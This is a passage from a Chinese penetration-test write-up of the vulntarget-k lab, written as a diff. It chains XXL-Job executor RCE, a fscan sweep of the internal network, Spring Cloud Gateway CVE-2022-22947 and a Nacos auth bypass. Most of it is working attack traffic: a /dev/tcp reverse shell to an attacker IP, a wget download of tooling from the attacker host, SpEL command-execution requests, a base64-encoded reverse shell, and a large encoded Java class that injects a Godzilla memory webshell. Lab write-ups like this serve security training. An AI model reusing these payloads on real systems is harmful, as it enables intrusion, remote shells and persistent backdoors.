&quot;GLUE_POWERSHELL&quot;,    // 任务模式，可选值参考com.xxl.job.core.glue.GlueTypeEnum  &quot;glueSource&quot;: &quot;calc&quot;,        // GLUE脚本代码  &quot;glueUpdatetime&quot;: 1586699003758,    // GLUE脚本更新时间，用于判定脚本是否变更以及是否需要刷新  &quot;broadcastIndex&quot;: 0,        // 分片参数：当前分片  &quot;broadcastTotal&quot;: 0        // 分片参数：总分片&#125;
+
+
+接着访问一下IP:8080/xxl-job-admin/toLogin任务调度中心登录如下：
+
+尝试弱口令admin/123456登录失败，再尝试命令执行来反弹shell，但是nc监听并没有返回，这里需要注意其中的任务模式glueType
+BEAN(&quot;BEAN&quot;, false, null, null),GLUE_GROOVY(&quot;GLUE(Java)&quot;, false, null, null),GLUE_SHELL(&quot;GLUE(Shell)&quot;, true, &quot;bash&quot;, &quot;.sh&quot;),GLUE_PYTHON(&quot;GLUE(Python)&quot;, true, &quot;python&quot;, &quot;.py&quot;),GLUE_PHP(&quot;GLUE(PHP)&quot;, true, &quot;php&quot;, &quot;.php&quot;),GLUE_NODEJS(&quot;GLUE(Nodejs)&quot;, true, &quot;node&quot;, &quot;.js&quot;),GLUE_POWERSHELL(&quot;GLUE(PowerShell)&quot;, true, &quot;powershell&quot;, &quot;.ps1&quot;);
+
+
+然后修改glueType为GLUE_SHELL再来尝试一下成功反弹shell
+POST /run HTTP/1.1Host: 192.168.150.11:9999User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Cache-Control: max-age=0Content-Length: 397 &#123;  &quot;jobId&quot;: 1,  &quot;executorHandler&quot;: &quot;demoJobHandler&quot;,  &quot;executorParams&quot;: &quot;demoJobHandler&quot;,  &quot;executorBlockStrategy&quot;: &quot;COVER_EARLY&quot;,  &quot;executorTimeout&quot;: 0,  &quot;logId&quot;: 1,  &quot;logDateTime&quot;: 1586629003729,  &quot;glueType&quot;: &quot;GLUE_SHELL&quot;,  &quot;glueSource&quot;: &quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.150.128/1234 0&gt;&amp;1&quot;,  &quot;glueUpdatetime&quot;: 1586699003758,  &quot;broadcastIndex&quot;: 0,   &quot;broadcastTotal&quot;: 0&#125;
+
+
+在/root目录下得到flag1：flag{xxl_job_admin_2.2.0_RCE}
+
+还发现存在网卡192.168.100.20
+
+于是上传fscan扫一下内网，发现存在主机192.168.100.50
+wget http://192.168.150.128/fscanchmod +x fscan./fscan -h 192.168.100.20/24 
+
+
+再来单独扫一下这台主机发现开放了22、8800、8848端口，存在nacos和SpringCloud服务并且有漏洞如下：
+root@vulntarget-k:/home/xxl-job/xxl-jar# ./fscan -h 192.168.100.50 -p 1-65535 -np&lt;b/xxl-jar# ./fscan -h 192.168.100.50 -p 1-65535 -np    ___                              _      / _ \     ___  ___ _ __ __ _  ___| | __  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ // /_\\_____\__ \ (__| | | (_| | (__|   &lt;    \____/     |___/\___|_|  \__,_|\___|_|\_\                        fscan version: 1.8.2start infoscan192.168.100.50:22 open192.168.100.50:8800 open192.168.100.50:8848 open[*] alive ports len is: 3start vulscan[*] WebTitle: http://192.168.100.50:8800 code:503 len:292    title:None[*] WebTitle: http://192.168.100.50:8848 code:404 len:431    title:HTTP Status 404 – Not Found[+] http://192.168.100.50:8848 poc-yaml-alibaba-nacos [+] http://192.168.100.50:8848 poc-yaml-alibaba-nacos-v1-auth-bypass [+] http://192.168.100.50:8800 Spring-Cloud-CVE-2022-22947 [+] http://192.168.100.50:8800 poc-yaml-spring-actuator-heapdump-file [+] http://192.168.100.50:8800 poc-yaml-springboot-env-unauth spring2
+
+springcloudgateway首先我们来看看8800端口，存在Spring-Cloud-CVE-2022-22947，尝试直接利用poc发现无法执行命令
+
+于是手工复现一下，先添加包含恶意的路由，201代表创建成功，payload如下：
+POST /actuator/gateway/routes/test HTTP/1.1Host: 192.168.100.50:8800User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeContent-Type: application/jsonUpgrade-Insecure-Requests: 1Cache-Control: max-age=0Content-Length: 325&#123;  &quot;id&quot;: &quot;test&quot;,  &quot;filters&quot;: [&#123;    &quot;name&quot;: &quot;AddResponseHeader&quot;,    &quot;args&quot;: &#123;      &quot;name&quot;: &quot;Result&quot;,      &quot;value&quot;: &quot;#&#123;new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;\&quot;id\&quot;&#125;).getInputStream()))&#125;&quot;    &#125;  &#125;],  &quot;uri&quot;: &quot;http://example.com&quot;&#125;
+
+
+再刷新网关路由即可触发该payload
+POST /actuator/gateway/refresh HTTP/1.1Host: 192.168.100.50:8800User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeContent-Type: application/x-www-form-urlencodedUpgrade-Insecure-Requests: 1Cache-Control: max-age=0
+
+
+访问/actuator/gateway/routes/test即可回显命令执行的结果
+
+执行ifconfig发现还有个网卡192.168.88.68
+
+执行cat /root/flag得到flag2：flag{nacos_springcloudgateway_rce}
+POST /actuator/gateway/routes/test HTTP/1.1Host: 192.168.100.50:8800User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeContent-Type: application/jsonUpgrade-Insecure-Requests: 1Cache-Control: max-age=0Content-Length: 352&#123;  &quot;id&quot;: &quot;test&quot;,  &quot;filters&quot;: [&#123;    &quot;name&quot;: &quot;AddResponseHeader&quot;,    &quot;args&quot;: &#123;      &quot;name&quot;: &quot;Result&quot;,      &quot;value&quot;: &quot;#&#123;new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;\&quot;cat\&quot;, \&quot;/root/flag\&quot;&#125;).getInputStream()))&#125;&quot;    &#125;  &#125;],  &quot;uri&quot;: &quot;http://example.com&quot;&#125;
+
+
+于是尝试反弹shell，对 getruntime 执行命令进行编码或者使用数组的形式命令执行，直接curl，但是都无法反弹shell，有可能是那种不出网的，nc收不到东西都
+POST /actuator/gateway/routes/test HTTP/1.1Host: 192.168.100.50:8800User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeContent-Type: application/jsonUpgrade-Insecure-Requests: 1Cache-Control: max-age=0Content-Length: 325&#123;  &quot;id&quot;: &quot;test&quot;,  &quot;filters&quot;: [&#123;    &quot;name&quot;: &quot;AddResponseHeader&quot;,    &quot;args&quot;: &#123;      &quot;name&quot;: &quot;Result&quot;,      &quot;value&quot;: &quot;#&#123;new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;\&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE1MC4xMjgvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;&#125;).getInputStream()))&#125;&quot;    &#125;  &#125;],  &quot;uri&quot;: &quot;http://example.com&quot;&#125;
+
+
+可能可以写入内存🐎吧，后面直接给我干蓝屏了😇咕咕咕~
+
+完事后需要删除所添加的路由，再刷新网关路由触发payload
+DELETE /actuator/gateway/routes/test HTTP/1.1Host: 192.168.100.50:8800User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Cache-Control: max-age=0
+
+附上作者wp写哥斯拉马的payload
+POST /actuator/gateway/routes/test HTTP/1.1Host: 192.168.100.50:8800User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeContent-Type: application/jsonUpgrade-Insecure-Requests: 1Cache-Control: max-age=0Content-Length: 10916 &#123;  &quot;id&quot;: &quot;test&quot;,  &quot;filters&quot;: [&#123;    &quot;name&quot;: &quot;AddResponseHeader&quot;,    &quot;args&quot;: &#123;      &quot;name&quot;: &quot;Result&quot;,      &quot;value&quot;: &quot;#&#123;T(org.springframework.cglib.core.ReflectUtils).defineClass(&#x27;ms.GMemShell&#x27;,T(org.springframework.util.Base64Utils).decodeFromString(&#x27;yv66vgAAADQBeAoADQC2BwC3CgACALYJABIAuAoAAgC5CQASALoKAAIAuwoAEgC8CQASAL0KAA0AvggAcgcAvwcAwAcAwQcAwgoADADDCgAOAMQHAMUIAJ8HAMYHAMcKAA8AyAsAyQDKCgASALYKAA4AywgAzAcAzQoAGwDOCADPBwDQBwDRCgDSANMKANIA1AoAHgDVBwDWCACBBwCECQDXANgKANcA2QgA2goA2wDcBwDdCgAVAN4KACoA3woA2wDgCgDbAOEIAOIKAOMA5AoAFQDlCgDjAOYHAOcKAOMA6AoAMwDpCgAzAOoKABUA6wgA7AoADADtCADuCgAMAO8IAPAIAPEKAAwA8ggA8wgA9AgA9QgA9ggA9wsAFAD4EgAAAP4KAP8BAAcBAQkBAgEDCgBHAQQKABsBBQsBBgEHCgASAQgKABIBCQkAEgEKCAELCwEMAQ0KABIBDgsBDAEPCAEQBwERCgBUALYKAA0BEgoAFQETCgANALsKAFQBFAoAEgEVCgAVARYKAP8BFwcBGAoAXQC2CABlCAEZAQAFc3RvcmUBAA9MamF2YS91dGlsL01hcDsBAAlTaWduYXR1cmUBADVMamF2YS91dGlsL01hcDxMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL09iamVjdDs+OwEABHBhc3MBABJMamF2YS9sYW5nL1N0cmluZzsBAANtZDUBAAJ4YwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAOTG1zL0dNZW1TaGVsbDsBAAhkb0luamVjdAEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAVcmVnaXN0ZXJIYW5kbGVyTWV0aG9kAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAA5leGVjdXRlQ29tbWFuZAEAEnJlcXVlc3RNYXBwaW5nSW5mbwEAQ0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9yZWFjdGl2ZS9yZXN1bHQvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbzsBAANtc2cBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQADb2JqAQASTGphdmEvbGFuZy9PYmplY3Q7AQAEcGF0aAEADVN0YWNrTWFwVGFibGUHAM0HAMcBABBNZXRob2RQYXJhbWV0ZXJzAQALZGVmaW5lQ2xhc3MBABUoW0IpTGphdmEvbGFuZy9DbGFzczsBAApjbGFzc2J5dGVzAQACW0IBAA51cmxDbGFzc0xvYWRlcgEAGUxqYXZhL25ldC9VUkxDbGFzc0xvYWRlcjsBAAZtZXRob2QBAApFeGNlcHRpb25zAQABeAEAByhbQlopW0IBAAFjAQAVTGphdmF4L2NyeXB0by9DaXBoZXI7AQABcwEAAW0BAAFaBwDFBwEaAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAB1MamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEAA3JldAEADGJhc2U2NEVuY29kZQEAFihbQilMamF2YS9sYW5nL1N0cmluZzsBAAdFbmNvZGVyAQAGYmFzZTY0AQARTGphdmEvbGFuZy9DbGFzczsBAAJicwEABXZhbHVlAQAMYmFzZTY0RGVjb2RlAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAB2RlY29kZXIBAANjbWQBAF0oTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZlci9TZXJ2ZXJXZWJFeGNoYW5nZTspTG9yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9SZXNwb25zZUVudGl0eTsBAAxidWZmZXJTdHJlYW0BAAJleAEABXBkYXRhAQAyTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZlci9TZXJ2ZXJXZWJFeGNoYW5nZTsBABlSdW50aW1lVmlzaWJsZUFubm90YXRpb25zAQA1TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2JpbmQvYW5ub3RhdGlvbi9Qb3N0TWFwcGluZzsBAAQvY21kAQANbGFtYmRhJGNtZCQxMQEARyhMb3JnL3NwcmluZ2ZyYW1ld29yay91dGlsL011bHRpVmFsdWVNYXA7KUxyZWFjdG9yL2NvcmUvcHVibGlzaGVyL01vbm87AQAGYXJyT3V0AQAfTGphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtOwEAAWYBAAJpZAEABGRhdGEBAChMb3JnL3NwcmluZ2ZyYW1ld29yay91dGlsL011bHRpVmFsdWVNYXA7AQAGcmVzdWx0AQAZTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwcAtwEACDxjbGluaXQ+AQAKU291cmNlRmlsZQEADkdNZW1TaGVsbC5qYXZhDABpAGoBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwAZQBmDAEbARwMAGgAZgwBHQEeDABnAJIMAGcAZgwBHwEgAQAPamF2YS9sYW5nL0NsYXNzAQAQamF2YS9sYW5nL09iamVjdAEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEAQW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3JlYWN0aXZlL3Jlc3VsdC9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvDAEhASIMASMBJAEADG1zL0dNZW1TaGVsbAEAMG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZlci9TZXJ2ZXJXZWJFeGNoYW5nZQEAEGphdmEvbGFuZy9TdHJpbmcMASUBKAcBKQwBKgErDAEsAS0BAAJvawEAE2phdmEvbGFuZy9FeGNlcHRpb24MAS4AagEABWVycm9yAQAXamF2YS9uZXQvVVJMQ2xhc3NMb2FkZXIBAAxqYXZhL25ldC9VUkwHAS8MATABMQwBMgEzDABpATQBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIHATUMATYAmQwBNwE4AQADQUVTBwEaDAE5AToBAB9qYXZheC9jcnlwdG8vc3BlYy9TZWNyZXRLZXlTcGVjDAE7ATwMAGkBPQwBPgE/DAFAAUEBAANNRDUHAUIMATkBQwwBRAFFDAFGAUcBABRqYXZhL21hdGgvQmlnSW50ZWdlcgwBSAE8DABpAUkMAR0BSgwBSwEeAQAQamF2YS51dGlsLkJhc2U2NAwBTAFNAQAKZ2V0RW5jb2RlcgwBTgEiAQAOZW5jb2RlVG9TdHJpbmcBABZzdW4ubWlzYy5CQVNFNjRFbmNvZGVyDAFPAVABAAZlbmNvZGUBAApnZXREZWNvZGVyAQAGZGVjb2RlAQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcgEADGRlY29kZUJ1ZmZlcgwBUQFSAQAQQm9vdHN0cmFwTWV0aG9kcw8GAVMQAVQPBwFVEACpDAFWAVcHAVgMAVkBWgEAJ29yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9SZXNwb25zZUVudGl0eQcBWwwBXAFdDABpAV4MAV8BHgcBYAwBYQFUDACcAJ0MAIkAigwAYQBiAQAHcGF5bG9hZAcBYgwBYwFUDACBAIIMAWQBZQEACnBhcmFtZXRlcnMBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQwBZgFnDAFoAWkMAWoBPAwAlQCWDAFoAUoMAWsBbAEAEWphdmEvdXRpbC9IYXNoTWFwAQAQM2M2ZTBiOGE5YzE1MjI0YQEAE2phdmF4L2NyeXB0by9DaXBoZXIBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQANc2V0QWNjZXNzaWJsZQEABChaKVYBAAVwYXRocwEAB0J1aWxkZXIBAAxJbm5lckNsYXNzZXMBAGAoW0xqYXZhL2xhbmcvU3RyaW5nOylMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvcmVhY3RpdmUvcmVzdWx0L21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8kQnVpbGRlcjsBAElvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9yZWFjdGl2ZS9yZXN1bHQvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbyRCdWlsZGVyAQAFYnVpbGQBAEUoKUxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9yZWFjdGl2ZS9yZXN1bHQvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbzsBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAA9wcmludFN0YWNrVHJhY2UBABBqYXZhL2xhbmcvVGhyZWFkAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAKShbTGphdmEvbmV0L1VSTDtMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylWAQARamF2YS9sYW5nL0ludGVnZXIBAARUWVBFAQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsBAAtnZXRJbnN0YW5jZQEAKShMamF2YS9sYW5nL1N0cmluZzspTGphdmF4L2NyeXB0by9DaXBoZXI7AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYBAARpbml0AQAXKElMamF2YS9zZWN1cml0eS9LZXk7KVYBAAdkb0ZpbmFsAQAGKFtCKVtCAQAbamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0AQAxKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEABmxlbmd0aAEAAygpSQEABnVwZGF0ZQEAByhbQklJKVYBAAZkaWdlc3QBAAYoSVtCKVYBABUoSSlMamF2YS9sYW5nL1N0cmluZzsBAAt0b1VwcGVyQ2FzZQEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAJZ2V0TWV0aG9kAQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwEAC2dldEZvcm1EYXRhAQAfKClMcmVhY3Rvci9jb3JlL3B1Ymxpc2hlci9Nb25vOwoBbQFuAQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsKABIBbwEABWFwcGx5AQAtKExtcy9HTWVtU2hlbGw7KUxqYXZhL3V0aWwvZnVuY3Rpb24vRnVuY3Rpb247AQAbcmVhY3Rvci9jb3JlL3B1Ymxpc2hlci9Nb25vAQAHZmxhdE1hcAEAPChMamF2YS91dGlsL2Z1bmN0aW9uL0Z1bmN0aW9uOylMcmVhY3Rvci9jb3JlL3B1Ymxpc2hlci9Nb25vOwEAI29yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9IdHRwU3RhdHVzAQACT0sBACVMb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL0h0dHBTdGF0dXM7AQA6KExqYXZhL2xhbmcvT2JqZWN0O0xvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvSHR0cFN0YXR1czspVgEACmdldE1lc3NhZ2UBACZvcmcvc3ByaW5nZnJhbWV3b3JrL3V0aWwvTXVsdGlWYWx1ZU1hcAEACGdldEZpcnN0AQANamF2YS91dGlsL01hcAEAA2dldAEAA3B1dAEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAJc3Vic3RyaW5nAQAWKElJKUxqYXZhL2xhbmcvU3RyaW5nOwEAC3RvQnl0ZUFycmF5AQAEanVzdAEAMShMamF2YS9sYW5nL09iamVjdDspTHJlYWN0b3IvY29yZS9wdWJsaXNoZXIvTW9ubzsHAXAMAXEBdAwAqACpAQAiamF2YS9sYW5nL2ludm9rZS9MYW1iZGFNZXRhZmFjdG9yeQEAC21ldGFmYWN0b3J5BwF2AQAGTG9va3VwAQDMKExqYXZhL2xhbmcvaW52b2tlL01ldGhvZEhhbmRsZXMkTG9va3VwO0xqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvaW52b2tlL01ldGhvZFR5cGU7TGphdmEvbGFuZy9pbnZva2UvTWV0aG9kVHlwZTtMamF2YS9sYW5nL2ludm9rZS9NZXRob2RIYW5kbGU7TGphdmEvbGFuZy9pbnZva2UvTWV0aG9kVHlwZTspTGphdmEvbGFuZy9pbnZva2UvQ2FsbFNpdGU7BwF3AQAlamF2YS9sYW5nL2ludm9rZS9NZXRob2RIYW5kbGVzJExvb2t1cAEAHmphdmEvbGFuZy9pbnZva2UvTWV0aG9kSGFuZGxlcwAhABIADQAAAAQACQBhAGIAAQBjAAAAAgBkAAkAZQBmAAAACQBnAGYAAAAJAGgAZgAAAAoAAQBpAGoAAQBrAAAALwABAAEAAAAFKrcAAbEAAAACAGwAAAAGAAEAAAAWAG0AAAAMAAEAAAAFAG4AbwAAAAkAcABxAAIAawAAAUgABwAG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&#x27;),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject(@requestMappingHandlerMapping,&#x27;/nnmm&#x27;)&#125;&quot;    &#125;  &#125;],  &quot;uri&quot;: &quot;http://example.com&quot;&#125;
+
+之后哥斯拉成功连接
+
+发现存在网卡192.168.88.60
+
+上传fscan扫一下发现另一台主机192.168.88.70（但是这里我一直上传不了，做了代理依旧没用🤡
+
+接着来看8848端口，nacos有个未授权访问漏洞，漏洞地址：&#x2F;nacos&#x2F;v1&#x2F;auth&#x2F;users?pageNo&#x3D;1&amp;pageSize&#x3D;9，发现绕过鉴权返回用户列表数据，但是密码通过bcrypt加密了
